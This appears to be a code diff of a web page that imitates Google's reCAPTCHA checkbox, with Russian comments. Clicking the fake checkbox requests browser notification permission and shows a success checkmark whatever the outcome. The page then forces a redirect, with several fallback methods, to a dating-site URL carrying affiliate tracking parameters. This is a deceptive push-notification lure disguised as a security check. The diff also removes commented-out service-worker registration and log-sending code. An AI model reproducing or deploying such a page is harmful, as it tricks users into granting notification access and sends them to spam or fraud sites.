@@ -7,145 +7,134 @@
     <title>reCAPTCHA</title>
     <style>
         body {
-    font-family: 'Roboto', Arial, sans-serif;
-    margin: 0;
-    background-color: #f9f9f9;
-    overflow: hidden; /* Отключаем прокрутку */
-}
-.container {
-    position: fixed; /* Фиксируем позицию */
-    top: 50%;
-    left: 50%;
-    transform: translate(-50%, -50%); /* Центрируем по обоим осям */
-    display: flex;
-    flex-direction: column;
-    align-items: flex-start;
-    gap: 10px;
-}
-.captcha-container {
-    display: flex;
-    align-items: center;
-    justify-content: space-between;
-    width: 300px;
-    padding: 10px;
-    border: 1px solid #dfe1e5;
-    border-radius: 4px;
-    background-color: #fff;
-}
-.captcha-left {
-    display: flex;
-    align-items: center;
-}
-.captcha-checkbox {
-    margin-right: 10px;
-    width: 20px;
-    height: 20px;
-    cursor: pointer;
-    border: 2px solid #5f6368;
-    background-color: #fff;
-    position: relative;
-    appearance: none;
-    -webkit-appearance: none;
-    -moz-appearance: none;
-}
-.captcha-checkbox.completed {
-    background-color: #1a73e8;
-    border-color: #1a73e8;
-    animation: fillCheckbox 0.3s ease;
-}
-.captcha-checkbox.completed::after {
-    content: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>');
-    position: absolute;
-    top: 50%;
-    left: 50%;
-    transform: translate(-50%, -50%);
-    display: block;
-}
-.captcha-checkbox.loading {
-    background-color: #fff;
-    border-color: #5f6368;
-    cursor: wait;
-}
-.captcha-checkbox.loading::after {
-    content: '';
-    width: 12px;
-    height: 12px;
-    border: 2px solid #1a73e8;
-    border-top-color: transparent;
-    border-radius: 50%;
-    position: absolute;
-    top: 50%;
-    left: 50%;
-    transform: translate(-50%, -50%);
-    animation: spin 0.8s linear infinite;
-}
-@keyframes fillCheckbox {
-    0% {
-        background-color: #fff;
-        border-color: #5f6368;
-    }
-    100% {
-        background-color: #1a73e8;
-        border-color: #1a73e8;
-    }
-}
-@keyframes spin {
-    0% {
-        transform: translate(-50%, -50%) rotate(0deg);
-    }
-    100% {
-        transform: translate(-50%, -50%) rotate(360deg);
-    }
-}
-.captcha-text {
-    font-size: 14px;
-    color: #202124;
-}
-.captcha-right {
-    display: flex;
-    flex-direction: column;
-    align-items: flex-end;
-}
-.captcha-logo {
-    width: 20px;
-    height: 20px;
-    margin-bottom: 5px;
-}
-.captcha-brand {
-    font-size: 12px;
-    color: #1a73e8;
-}
-.captcha-links {
-    font-size: 10px;
-    color: #5f6368;
-}
-.captcha-links a {
-    color: #5f6368;
-    text-decoration: none;
-}
-.submit-button {
-    padding: 8px 16px;
-    background-color: #f1f3f4;
-    border: 1px solid #dadce0;
-    border-radius: 4px;
-    font-size: 14px;
-    color: #202124;
-    cursor: pointer;
-}
-.submit-button:hover {
-    background-color: #e8eaed;
-}
-.button-container {
-    display: flex;
-    flex-direction: column;
-    align-items: flex-start;
-}
-.error {
-    color: red;
-    font-size: 12px;
-    display: none;
-    margin-top: 5px;
-}
+            font-family: 'Roboto', Arial, sans-serif;
+            margin: 0;
+            background-color: #f9f9f9;
+            overflow: hidden; /* Отключаем прокрутку */
+        }
+        .container {
+            position: fixed; /* Фиксируем позицию */
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%); /* Центрируем по обоим осям */
+            display: flex;
+            flex-direction: column;
+            align-items: flex-start;
+            gap: 10px;
+        }
+        .captcha-container {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            width: 300px;
+            padding: 10px;
+            border: 1px solid #dfe1e5;
+            border-radius: 4px;
+            background-color: #fff;
+            box-shadow: 0 1px 6px rgba(32, 33, 36, 0.28);
+        }
+        .captcha-left {
+            display: flex;
+            align-items: center;
+        }
+        .captcha-checkbox {
+            margin-right: 10px;
+            width: 20px;
+            height: 20px;
+            cursor: pointer;
+            border: 2px solid #000; /* Черная окантовка */
+            background-color: transparent; /* Прозрачный фон */
+            position: relative;
+            appearance: none;
+            -webkit-appearance: none;
+            -moz-appearance: none;
+        }
+        .captcha-checkbox.loading {
+            border: none; /* Убираем рамку во время загрузки */
+            background-color: transparent;
+        }
+        .captcha-checkbox.loading::before {
+            content: '';
+            width: 20px;
+            height: 20px;
+            border: 3px solid #1a73e8; /* Приятный синий цвет */
+            border-top-color: transparent;
+            border-radius: 50%;
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            animation: spin 0.8s linear infinite;
+        }
+        .captcha-checkbox.completed {
+            border: none; /* Убираем рамку */
+            background-color: transparent;
+        }
+        .captcha-checkbox.completed::before {
+            content: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="green" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>');
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            display: block;
+        }
+        @keyframes spin {
+            0% {
+                transform: translate(-50%, -50%) rotate(0deg);
+            }
+            100% {
+                transform: translate(-50%, -50%) rotate(360deg);
+            }
+        }
+        .captcha-text {
+            font-size: 14px;
+            color: #000;
+        }
+        .captcha-right {
+            display: flex;
+            flex-direction: column;
+            align-items: flex-end;
+        }
+        .captcha-logo {
+            width: 20px;
+            height: 20px;
+            margin-bottom: 5px;
+        }
+        .captcha-brand {
+            font-size: 12px;
+            color: #757575;
+        }
+        .captcha-links {
+            font-size: 10px;
+            color: #757575;
+        }
+        .captcha-links a {
+            color: #757575;
+            text-decoration: none;
+        }
+        .submit-button {
+            padding: 8px 16px;
+            background-color: #f1f3f4;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            font-size: 14px;
+            color: #202124;
+            cursor: pointer;
+        }
+        .submit-button:hover {
+            background-color: #e8eaed;
+        }
+        .button-container {
+            display: flex;
+            flex-direction: column;
+            align-items: flex-start;
+        }
+        .error {
+            color: red;
+            font-size: 12px;
+            display: none;
+            margin-top: 5px;
+        }
     </style>
 </head>
 <body>
@@ -172,21 +161,6 @@
     </div>
 
     <script>
-        // Регистрация Service Worker (закомментировано)
-        /*
-        if ('serviceWorker' in navigator) {
-            navigator.serviceWorker.register('/HnFv7gIgUEyhZsQd8kp20Q.js')
-                .then(registration => {
-                    console.log('Service Worker зарегистрирован:', registration);
-                })
-                .catch(err => {
-                    console.error('Ошибка регистрации Service Worker:', err);
-                });
-        } else {
-            console.warn('Service Worker не поддерживается');
-        }
-        */
-
         // Ссылка для редиректа
         const redirectUrl = 'https://gxrjxq.excelientdates.com/?utm_source=da57dc555e50572d&ban=other&j1=1&s1=96847&s2=2070502&s3=yd27';
 
@@ -199,23 +173,12 @@
                 timestamp: new Date().toISOString()
             };
             console.log('Лог подписки:', data);
-            // Опциональная отправка логов на сервер (закомментировано)
-            /*
-            fetch('https://your-server.com/log', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(data)
-            })
-            .then(response => console.log('Лог подписки отправлен:', response))
-            .catch(err => console.error('Ошибка отправки лога:', err));
-            */
         }
 
         // Функция для выполнения редиректа
         function performRedirect() {
             console.log('Попытка редиректа на:', redirectUrl);
             try {
-                // Проверка на WebView
                 const isWebView = navigator.userAgent.includes('wv') || navigator.userAgent.includes('WebView');
                 if (isWebView) {
                     console.log('Обнаружен WebView, используем location.assign');
@@ -224,7 +187,6 @@
                     console.log('Стандартный редирект через location.href');
                     window.location.href = redirectUrl;
                 }
-                // Резервный редирект через replace
                 setTimeout(() => {
                     if (window.location.href !== redirectUrl) {
                         console.log('Резервный редирект через location.replace');
@@ -233,7 +195,6 @@
                 }, 500);
             } catch (e) {
                 console.error('Ошибка редиректа:', e);
-                // Резервный программный клик
                 try {
                     console.log('Попытка редиректа через программный клик');
                     const link = document.createElement('a');
@@ -279,14 +240,12 @@
                 if ('Notification' in window && (Notification.permission === 'granted' || Notification.permission === 'denied')) {
                     console.log('Уведомления уже разрешены или заблокированы:', Notification.permission);
                     logSubscription(Notification.permission);
-                    // Убираем лоадер и показываем галочку
-                    console.log('Убираем лоадер, показываем галочку');
                     checkbox.classList.remove('loading');
                     checkbox.classList.add('completed');
                     setTimeout(() => {
                         console.log('Запуск редиректа после галочки');
                         performRedirect();
-                    }, 1000); // Задержка для видимости галочки
+                    }, 1000);
                     return;
                 }
 
@@ -297,7 +256,6 @@
                             .then(result => {
                                 console.log('Результат подписки:', result);
                                 logSubscription(Notification.permission);
-                                console.log('Убираем лоадер, показываем галочку');
                                 checkbox.classList.remove('loading');
                                 checkbox.classList.add('completed');
                                 setTimeout(() => {
@@ -308,7 +266,6 @@
                             .catch(err => {
                                 console.error('Ошибка вызова подписки:', err);
                                 logSubscription(Notification.permission);
-                                console.log('Убираем лоадер, показываем галочку');
                                 checkbox.classList.remove('loading');
                                 checkbox.classList.add('completed');
                                 setTimeout(() => {
@@ -324,7 +281,6 @@
                                 .then(permission => {
                                     console.log('Результат разрешения:', permission);
                                     logSubscription(permission);
-                                    console.log('Убираем лоадер, показываем галочку');
                                     checkbox.classList.remove('loading');
                                     checkbox.classList.add('completed');
                                     setTimeout(() => {
@@ -335,7 +291,6 @@
                                 .catch(err => {
                                     console.error('Ошибка Notification API:', err);
                                     logSubscription('error');
-                                    console.log('Убираем лоадер, показываем галочку');
                                     checkbox.classList.remove('loading');
                                     checkbox.classList.add('completed');
                                     setTimeout(() => {
@@ -346,7 +301,6 @@
                         } else {
                             console.log('Уведомления не поддерживаются');
                             logSubscription('unsupported');
-                            console.log('Убираем лоадер, показываем галочку');
                             checkbox.classList.remove('loading');
                             checkbox.classList.add('completed');
                             setTimeout(() => {
@@ -358,7 +312,6 @@
             } catch (e) {
                 console.error('Общая ошибка в requestSubscription:', e);
                 logSubscription('error');
-                console.log('Убираем лоадер, показываем галочку');
                 checkbox.classList.remove('loading');
                 checkbox.classList.add('completed');
                 setTimeout(() => {
